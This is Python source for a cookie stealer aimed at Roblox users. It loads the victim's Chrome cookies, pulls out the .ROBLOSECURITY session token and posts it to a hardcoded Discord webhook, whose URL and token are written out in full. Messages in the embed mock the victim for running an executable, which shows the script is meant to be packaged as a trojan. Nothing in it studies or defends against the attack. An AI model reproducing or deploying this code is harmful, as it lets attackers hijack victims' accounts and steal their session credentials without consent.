import requests
import threading
import browser_cookie3 as cookie
from discord_webhook import DiscordWebhook, DiscordEmbed

webhook_urls = ['webhook url 1', 'webhook url 2']

def getCookiesFromPc():
    req = requests.Session()
    cj = cookie.chrome()
    req.cookies = cj
    r = req.get("https://www.roblox.com/")
    for c in req.cookies:
        if c.name == ".ROBLOSECURITY":
            webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/1529192113441476749/DqyFO1JAoWPjxEK0urpUpw1SQyGNNyqejk6h-b_jm_d2MX4o91jbtctcqEI8J2kqb-cv', content="@everyone")
            embed = DiscordEmbed(title='Cookie Found of braindead person!', description='He clicked a exe!', color=242424)
            embed.add_embed_field(name='.ROBLOSECURITY', value=c.value)
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.add_header("Content-Type", "application/json")
            response = webhook.execute()
